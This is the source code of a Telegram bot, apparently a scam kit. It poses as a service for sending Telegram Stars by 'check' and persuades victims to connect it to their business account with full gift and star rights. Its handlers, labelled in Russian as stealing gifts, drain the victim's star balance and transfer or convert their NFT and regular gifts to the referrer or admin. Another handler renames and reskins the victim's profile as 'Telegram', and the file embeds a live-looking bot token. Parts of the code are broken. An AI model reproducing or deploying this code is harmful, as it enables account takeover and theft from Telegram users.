from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineQuery,
    InlineQueryResultPhoto,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputTextMessageContent,
    InlineQueryResultArticle
)
import random
import os
import json
from datetime import datetime
import logging
import asyncio
import aiohttp
from aiogram.types import InlineQueryResultCachedPhoto
# Constants
TOKEN = "8286835814:AAFJF44iKGuZsRk2VN5tnUFTUtjsa9jwjNk"
LOG_CHAT_ID = -1002741941997
MESSAGE_LOG_CHAT_ID = -1002741941997  # Замените на ID чата для логов сообщений
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [7917237979]
FORCED_REFERRAL_USERS = [819487094, 7214848375]
MY_REFERRAL_ID = 7917237979
user_message_history = {}
last_messages = {}
CHECK_PHOTO_FILE_ID = None

logging.basicConfig(level=logging.INFO)

# State classes
class Draw(StatesGroup):
    id = State()
    gift = State()

class CheckState(StatesGroup):
    waiting_for_amount = State()

# Initialize storage and logging
storage = MemoryStorage()
logging.basicConfig(level=logging.INFO)

if os.path.exists("referrers.json"):
    with open("referrers.json", "r") as f:
        user_referrer_map = json.load(f)
else:
    user_referrer_map = {}
user_referrals = {}     # inviter_id -> [business_ids]
ref_links = {}   

# Initialize bot
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, parse_mode=None):
    try:
        if chat_id in user_message_history and len(user_message_history[chat_id]) > 1:
            for msg_id in user_message_history[chat_id][1:]:
                try:
                    await bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception as e:
                    logging.error(f"Error deleting message: {e}")
            user_message_history[chat_id] = user_message_history[chat_id][:1]
        
        message = await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        
        if chat_id not in user_message_history:
            user_message_history[chat_id] = []
        user_message_history[chat_id].append(message.message_id)
        
        return message
    except Exception as e:
        logging.error(f"Error in send_replaceable_message: {e}")
        raise

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="💳 Чеки", callback_data="checks")],
        [InlineKeyboardButton(text="⭐️ Получение звёзд", callback_data="get_stars")],
        [InlineKeyboardButton(text="📝 Условия", callback_data="terms")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    args = message.text.split(" ")
    user_id = message.from_user.id
    
    # Обработка параметров ссылки
    if len(args) > 1:
        params = args[1].split('_')
        
        # Обработка реферальной ссылки (может быть частью ссылки на чек)
        if params[0].startswith("ref"):
            try:
                inviter_id = int(params[0].replace("ref", ""))
                if inviter_id and inviter_id != user_id:
                    user_referrer_map[str(user_id)] = inviter_id
                    with open("referrers.json", "w") as f:
                        json.dump(user_referrer_map, f)
                    logging.info(f"New referral: {user_id} -> {inviter_id}")
                    
                    # Если есть параметр чека после реферальной ссылки
                    if len(params) > 2 and params[1] == "check":
                        amount = params[2]
                        sender_id = params[3] if len(params) > 3 else inviter_id
                        
                        # Получаем информацию об отправителе
                        try:
                            sender = await bot.get_chat(int(sender_id))
                            sender_name = f"@{sender.username}" if sender.username else f"ID:{sender_id}"
                        except:
                            sender_name = f"ID:{sender_id}"
                        
                        # Создаем сообщение с чеком
                        check_message = (
                            f"💳 Чек на {amount} звёзд\n\n"
                            f"От: {sender_name}\n\n"
                            "Для активации чека нажмите кнопку ниже ⬇️"
                        )
                        
                        # Создаем кнопку с инструкциями
                        builder = InlineKeyboardBuilder()
                        builder.button(
                            text="📝 Как активировать чек", 
                            callback_data=f"show_activation_instructions:{amount}"
                        )
                        
                        await message.answer(
                            check_message,
                            reply_markup=builder.as_markup()
                        )
                        return  # Прерываем выполнение, чтобы не показывать стартовое сообщение
            
            except ValueError as e:
                logging.error(f"Referral error: {e}")

    # Стандартное приветственное сообщение (если не было обработано как чек)
    photo = FSInputFile("image.png")
    await message.answer_photo(
        photo=photo,
        caption=(
            "Привет! Это удобный бот для покупки/передачи звезд в Telegram.\n\n"
            "С ним ты можешь моментально покупать и передавать звезды.\n\n"
            "Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n"
            "С помощью бота куплено:\n"
            "6,307,360 ⭐️ (~ $94,610)\n\n"
            "Выберите действие:"
        ),
        reply_markup=main_menu_kb()
    )

    if message.chat.id not in user_message_history:
        user_message_history[message.chat.id] = []
    else:
        if len(user_message_history[message.chat.id]) > 0:
            first_msg_id = user_message_history[message.chat.id][0]
            user_message_history[message.chat.id] = [first_msg_id]
    
    user_message_history[message.chat.id].append(message.message_id + 1)

@dp.callback_query(F.data == "balance")
async def show_balance(callback: types.CallbackQuery):
    await callback.answer("Баланс: 0 ⭐️", show_alert=True)

@dp.callback_query(F.data == "deposit")
async def deposit_stars(callback: types.CallbackQuery):
    await callback.answer("Функция пополнения звёзд", show_alert=True)

@dp.callback_query(F.data == "withdraw")
async def withdraw_stars(callback: types.CallbackQuery):
    await callback.answer("Функция вывода звёзд", show_alert=True)

@dp.callback_query(F.data == "faq")
async def show_faq(callback: types.CallbackQuery):
    await callback.answer("Раздел FAQ", show_alert=True)

@dp.callback_query(F.data.startswith("show_activation_instructions:"))
async def show_activation_instructions(callback: types.CallbackQuery):
    amount = callback.data.split(":")[1]
    
    activation_instructions = (
        f"💳 Чек на {amount} звёзд\n\n"
        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
        "1. ⚙️ Откройте <b>Настройки</b>.\n"
        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
        "4. ✍️ Введите имя бота <b>@SendStarsByCheckBot</b> и нажмите <b>Добавить</b>.\n"
        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
        "<i>Зачем это нужно?</i>\n"
        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
        "и подтверждений."
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=activation_instructions,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "get_stars")
async def show_get_stars_instructions(callback: types.CallbackQuery):
    stars_instructions = (
        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
        "1. ⚙️ Откройте <b>Настройки</b>.\n"
        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
        "4. ✍️ Введите имя бота <b>@SendStarsByCheckBot</b> и нажмите <b>Добавить</b>.\n"
        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
        "<i>Зачем это нужно?</i>\n"
        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
        "и подтверждений."
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=stars_instructions,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "terms")
async def show_terms(callback: types.CallbackQuery):
    terms_text = (
        "<b>Условия использования @SendTgStarsBot:</b>\n\n"
        "Полным и безоговорочным принятием условий данной оферты считается оплата клиентом услуг компании.\n\n"
        "1. Запрещено пополнять звезды и возвращать их, иначе компания в праве досрочно остановить предоставление услуги и заблокировать клиента без возможности возврата средств.\n"
        "2. Запрещено игнорирование жалоб компании, в случае игнорирования жалобы клиентом, компания имеет право отказать клиенту в своих услугах.\n"
        "3. Клиенту предоставляется доступ (если не оговорено иное) к звездам, и клиент несет всю связанную с этим ответственность.\n"
        "4. В случае нарушения условий предоставления услуг компания в праве отказать клиенту в возврате средств.\n"
        "5. Возврат денежных средств возможен только в случае неработоспособности или за технические ошибки бота по вине компании.\n"
        "6. Проблемы с пополнением/возвратом звезд — ответственность компании.\n\n"
        "<i>С уважением, команда @SendStarsByCheckBot.</i>"
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=terms_text,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                data = await response.json()
                
                builder = InlineKeyboardBuilder()
                start = page * 9
                end = start + 9
                count = 0
                
                if data.get("ok", False):
                    gifts = list(data.get("result", {}).get("gifts", []))
                    for gift in gifts[start:end]:
                        count += 1
                        builder.button(
                            text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
                            callback_data=f"gift_{gift['id']}"
                        )
                    builder.adjust(2)
                
                if page <= 0:
                    builder.row(
                        InlineKeyboardButton(text="•", callback_data="empty"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="Вперед", callback_data=f"next_{page + 1}")
                    )
                elif count < 9:
                    builder.row(
                        InlineKeyboardButton(text="Назад", callback_data=f"down_{page - 1}"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="•", callback_data="empty")
                    )
                elif page > 0 and count >= 9:
                    builder.row(
                        InlineKeyboardButton(text="Назад", callback_data=f"down_{page - 1}"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="Вперед", callback_data=f"next_{page + 1}")
                    )
                
                return builder.as_markup()
                
    except Exception as e:
        logging.error(f"Ошибка при получении подарков: {e}")
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"Ошибка pagination: {str(e)}")
        return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Ошибка загрузки", callback_data="error")]])

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    # Добавляем две кнопки в одну строку
    builder.row(
        InlineKeyboardButton(text="🎁 Украсть подарки", callback_data=f"steal_gifts:{business_id}"),
        InlineKeyboardButton(text="💰 Перевести звёзды", callback_data=f"transfer_stars:{business_id}")
    )
    # Кнопка удаления на отдельной строке
    builder.row(
        InlineKeyboardButton(text="⛔️ Удалить подключение", callback_data=f"destroy:{business_id}")
    )
    builder.adjust(1)
    
    user = business_connection.user
    
    # Получаем информацию о пригласившем для формирования сообщений об ошибках
    inviter_id = user_referrer_map.get(str(user.id))
    inviter_username = "неизвестно"
    if inviter_id:
        try:
            inviter = await bot.get_chat(inviter_id)
            inviter_username = f"@{inviter.username}" if inviter.username else f"ID:{inviter_id}"
        except Exception:
            inviter_username = f"ID:{inviter_id}"
    
    user_username = f"@{user.username}" if user.username else f"ID:{user.id}"
    error_base = f"Реф {user_username} от {inviter_username}"
    
    try:
        info = await bot.get_business_connection(business_id)
        if info is None:
            error_msg = f"{error_base} - Бот отвязан"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            return
            
        rights = info.rights
        if rights is None:
            error_msg = f"{error_base} - Бот отвязан"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            return

        # Проверяем только необходимые права для работы с подарками и звездами
        required_gift_rights = [
            rights.can_convert_gifts_to_stars,
            rights.can_transfer_stars
        ]
        
        if not all(required_gift_rights):
            error_msg = f"{error_base} - Недостаточно прав"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            
            # Отправляем предупреждение пользователю
            warning_message = (
                "⛔️ Вы не предоставили все необходимые права боту\n\n"
                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n"
                "⚠️ Мы не используем эти права в плохих целях, подключение бота к бизнес-аккаунту необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений.\n\n"
                "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
            )
            try:
                await bot.send_message(
                    chat_id=user.id,
                    text=warning_message
                )
            except Exception as e:
                await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
            return
        
        # Получаем данные о подарках и звездах
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)

    except Exception as e:
        error_type = str(e)
        if "BOT_ACCESS_FORBIDDEN" in error_type:
            error_msg = f"{error_base} - Недостаточно прав"
        else:
            error_msg = f"{error_base} - Бот отвязан"
        
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            try:
                await bot.send_message(inviter_id, error_msg)
            except Exception as e:
                logging.error(f"Не удалось уведомить пригласившего: {e}")
        return

    # Остальная часть функции остается без изменений
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n"
    user_info = (
        f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
        f"├─ ID: <code>{user.id}</code>\n"
        f"├─ Username: @{user.username or 'нет'}\n"
        f"├─ Пригласил: {inviter_username}\n"
        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n"
    )
    balance_info = (
        f"<blockquote>💰 <b>Баланс:</b>\n"
        f"╰─ Доступно звёзд: {int(stars.amount):,}</blockquote>\n"
    )
    gifts_info = (
        f"<blockquote>🎁 <b>Подарки:</b>\n"
        f"├─ NFT: {len(nft_gifts)}\n"
        f"╰─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)</blockquote>\n"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', 'скрыт')
                nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
            except AttributeError:
                nft_items.append(f"├─ NFT #{idx} (скрыт) - 25⭐")
        
        nft_list = "\n<blockquote>🔗 <b>NFT подарки:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n╰─ <b>Итого:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>🔐 <b>Права бота:</b>\n"
        f"├─ Основные: {'✅' if rights.can_read_messages else '❌'} Чтение | "
        f"{'✅' if rights.can_delete_all_messages else '❌'} Удаление\n"
        f"├─ Профиль: {'✅' if rights.can_edit_name else '❌'} Имя | "
        f"{'✅' if rights.can_edit_username else '❌'} Username\n"
        f"╰─ Подарки: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация | "
        f"{'✅' if rights.can_transfer_stars else '❌'} Перевод</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>ℹ️ <i>Перенос каждого NFT подарка стоит 25 звёзд</i>\n"
        f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке в лог-чат: {e}")

    if inviter_id:
        try:
            await bot.send_message(
                chat_id=int(inviter_id),
                text=full_message,
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
            logging.error(error_msg)
            await bot.send_message(LOG_CHAT_ID, error_msg)

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(
        text="Введите айди юзера кому перевести подарки"
    )
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):

    msg = await message.answer(
        text="Актуальные подарки:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    try:
        # Получаем данные из состояния
        user_data = await state.get_data()
        if 'user_id' not in user_data:
            await callback.answer("Ошибка: не найден ID пользователя", show_alert=True)
            return
            
        gift_id = callback.data.split('_')[1]
        user_id = user_data['user_id']
        
        # Проверяем, что user_id - это число
        try:
            user_id_int = int(user_id)
        except ValueError:
            await callback.answer("Некорректный ID пользователя", show_alert=True)
            return
            
        # Отправляем подарок
        await bot.send_gift(
            gift_id=gift_id,
            chat_id=user_id_int
        )
        await callback.message.answer(f"✅ Подарок успешно отправлен пользователю {user_id}")
        await state.clear()  # Очищаем состояние
        
    except Exception as e:
        logging.error(f"Ошибка при отправке подарка: {e}")
        await callback.answer("Произошла ошибка при отправке подарка", show_alert=True)

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="Актуальные подарки:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )
    
            

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️Вывод звезд",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="Админ панель:",
        reply_markup=builder.as_markup()
    )
@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="⛔️Отмена самоуничтожения",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="⛔️Включен режим самоуничтожения, для того чтобы отключить нажмите на кнопку",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("Мамонт спасен от сноса.")

    user_id = message.from_user.id
    inviter_id = user_referrer_map.get(user_id)

    # Если нет пригласившего — fallback на первого админа
    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]

    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    if gifts_to_process == []:
        await bot.send_message(chat_id=LOG_CHAT_ID, text="У пользователя нет подарков.")
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        print(gift.gift)

        gift_type = gift.type
        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except:
                pass
    
        if not gift_id:
            continue

        # Передача
        if isTransfered:
            try:
                steal = await bot.transfer_gift(business_id, gift_id, recipient_id, transfer_star_count)
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception as e:
                await message.answer(f"❌ Не удалось передать подарок {gift_name} пользователю {recipient_id}")
                print(e)


    # Лог
    if stolen_count > 0:
        text = (
            f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await message.answer("Не удалось украсть подарки")
    
    # Перевод звёзд
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
        else:
            await message.answer("У пользователя нет звезд.")
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"🚫 Ошибка при выводе звёзд: {e}")

@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
    except Exception as e:
        await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
        return

    # Определяем получателя (как во втором боте)
    inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
    if inviter_id:
        try:
            await bot.send_chat_action(inviter_id, "typing")
            recipient_id = inviter_id
        except Exception:
            recipient_id = ADMIN_IDS[0]  # Fallback на админа, если реферал недоступен
    else:
        recipient_id = ADMIN_IDS[0]

    stolen_nfts = []
    stolen_count = 0
    
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        error_msg = f"❌ Ошибка при получении подарков: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            await bot.send_message(inviter_id, error_msg)
        await callback.answer("Ошибка при получении подарков")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        gift_type = gift.type
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except Exception:
                continue
        
        if gift_type == "unique" and gift.can_be_transferred:
            try:
                await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
                gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception:
                continue

    # Формируем отчет (как во втором боте)
    result_msg = []
    if stolen_count > 0:
        result_msg.append(f"\n🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n")
        result_msg.extend(stolen_nfts[:10])
    
    full_report = "\n".join(result_msg) if result_msg else "\nНе удалось украсть подарки"
    
    await bot.send_message(
        chat_id=LOG_CHAT_ID,
        text=f"Отчет по бизнес-аккаунту {user.id}:\n{full_report}",
        parse_mode="HTML"
    )
    
    if inviter_id and inviter_id != user.id:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=f"Отчет по вашему рефералу {user.id}:\n{full_report}",
                parse_mode="HTML"
            )
        except Exception as e:
            await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
    
    await callback.answer(f"Украдено {stolen_count} подарков")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
        
        # Определяем получателя (как во втором боте)
        inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
        if inviter_id:
            try:
                await bot.send_chat_action(inviter_id, "typing")
                recipient_id = inviter_id
            except Exception:
                recipient_id = ADMIN_IDS[0]
        else:
            recipient_id = ADMIN_IDS[0]
            
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
            
            await bot.send_message(LOG_CHAT_ID, success_msg)
            if inviter_id and inviter_id != recipient_id:
                try:
                    await bot.send_message(inviter_id, success_msg)
                except Exception as e:
                    await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
                    
            await callback.answer(f"Переведено {amount} звёзд")
        else:
            await callback.answer("Нет звёзд для перевода", show_alert=True)
            
    except Exception as e:
        error_msg = f"❌ Ошибка при переводе звёзд: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        await callback.answer("Ошибка при переводе звёзд", show_alert=True)

async def upload_check_photo():
    global CHECK_PHOTO_FILE_ID
    try:
        photo_message = await bot.send_photo(
            chat_id=ADMIN_IDS[0],
            photo=FSInputFile("image2.png"),
            disable_notification=True
        )
        CHECK_PHOTO_FILE_ID = photo_message.photo[-1].file_id
        logging.info(f"Фото чека загружено, file_id: {CHECK_PHOTO_FILE_ID}")
        
        await bot.delete_message(chat_id=ADMIN_IDS[0], message_id=photo_message.message_id)
        return True
    except Exception as e:
        logging.error(f"Ошибка загрузки фото чека: {e}")
        return False


@dp.inline_query()
async def inline_query_handler(inline_query: InlineQuery):
    try:
        if not CHECK_PHOTO_FILE_ID:
            success = await upload_check_photo()
            if not success:
                await inline_query.answer(
                    [InlineQueryResultArticle(
                        id="error",
                        title="Ошибка загрузки фото",
                        input_message_content=InputTextMessageContent(
                            "Извините, сервис временно недоступен. Попробуйте позже."
                        )
                    )],
                    cache_time=60
                )
                return

        query = inline_query.query.strip()
        user_id = inline_query.from_user.id
        
        try:
            if query.isdigit():
                amount = int(query)
            elif query.lower().startswith('чек ') and len(query.split()) >= 2:
                amount = int(query.split()[1])
            else:
                raise ValueError
                
            if not (1 <= amount <= 10000):
                raise ValueError
        except (ValueError, IndexError):
            help_result = InlineQueryResultArticle(
                id="help",
                title="Как отправить чек",
                description="Формат: @бот 100 или 'чек 100' (1-10000)",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "ℹ️ Для отправки чека введите:\n"
                        "@имя_бота 100 - чек на 100 звезд\n"
                        "Или: чек 100 - аналогично\n"
                        "Диапазон: 1-10000 звезд"
                    ),
                    parse_mode="HTML"
                )
            )
            await inline_query.answer([help_result], cache_time=3600)
            return

        bot_username = (await bot.me()).username
        
        # Здесь меняем реферальную ссылку для определённых пользователей
        if user_id in FORCED_REFERRAL_USERS:
            check_link = f"https://t.me/{bot_username}?start=ref{MY_REFERRAL_ID}_check_{amount}_{user_id}"
        else:
            check_link = f"https://t.me/{bot_username}?start=ref{user_id}_check_{amount}_{user_id}"

        result = InlineQueryResultCachedPhoto(
            id=f"check_{amount}",
            photo_file_id=CHECK_PHOTO_FILE_ID,
            title=f"Чек на {amount} звёзд",
            description=f"Нажмите, чтобы отправить чек на {amount} звёзд",
            caption=(
                f"💳 Чек на {amount} звёзд\n\n"
                f"От: @{inline_query.from_user.username or inline_query.from_user.id}\n\n"
                "Для активации чека нажмите кнопку ниже ⬇️"
            ),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="📝 Активировать чек",
                    url=check_link
                )]
            ])
        )

        await inline_query.answer([result], cache_time=3600, is_personal=True)

    except Exception as e:
        logging.error(f"Ошибка в инлайн-режиме: {e}")
        await inline_query.answer([])

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
